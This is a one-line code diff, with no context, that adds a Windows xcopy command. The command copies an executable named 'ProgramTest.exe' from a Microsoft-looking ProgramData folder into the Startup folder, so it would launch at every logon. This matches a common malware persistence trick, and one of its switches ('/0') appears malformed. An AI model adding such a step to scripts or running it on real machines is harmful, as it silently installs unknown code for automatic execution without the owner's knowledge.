@@ -1,0 +1,1 @@
+xcopy C:\ProgramData\Microsoft\ProgramTest.exe C:\ProgramData\Microsoft\Windows\"Start Menu"\Programs\StartUp /0 /X /E /H /K
